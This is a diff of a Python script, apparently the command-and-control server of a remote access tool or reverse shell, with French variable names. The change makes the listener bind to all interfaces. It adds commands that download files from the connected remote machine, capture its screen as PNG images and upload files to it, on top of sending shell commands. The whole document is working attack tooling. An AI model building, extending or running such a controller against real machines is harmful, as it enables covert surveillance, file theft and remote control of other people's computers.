@@ -1,6 +1,6 @@
 import socket
 
-HOST_IP = "127.0.0.1"
+HOST_IP = ""
 HOST_PORT = 3500
 MAX_DATA_SIZE = 1024
 
@@ -54,10 +54,38 @@ while True:
         break
     commande = input(client_adress[0] + ":" + str(client_adress[1]) + " " + infos_data.decode('ascii', errors='ignore') + " > ")
     
-    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
-    #print("data_recues longueur:", len(data_recues))
-    print(data_recues.decode('ascii', errors='ignore'))
+    commande_split = commande.split(" ")
+    dl_filename = None
+    if len(commande_split) == 2 and commande_split[0] == "dl":
+        dl_filename = commande_split[1]
+    elif len(commande_split) == 2 and commande_split[0] == "screenshot":
+        dl_filename = commande_split[1] + ".png"
+    elif len(commande_split) == 2 and commande_split[0] == "upload":
+        try:
+            f = open(commande_split[1], "rb")
+            
+        except FileNotFoundError:
+            reponse = " ".encode('ascii', errors='ignore')
+        else:
+            commande = commande + " " + f.read().decode('ascii', errors='ignore')
+            f.close()
+        
     
+    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
+    if not data_recues:
+        break
+    
+    if dl_filename:
+        if len(data_recues) == 1 and data_recues == b" ":
+            print("Erreur: Le fichier", dl_filename, "n'existe pas")
+        else:
+            f = open(dl_filename, "wb")
+            f.write(data_recues)
+            f.close()
+            print("Fichier", dl_filename, "téléchargé.")
+        dl_filename = None
+    else:
+        print(data_recues.decode('ascii', errors='ignore'))
     
 s.close()
 connection_socket.close()
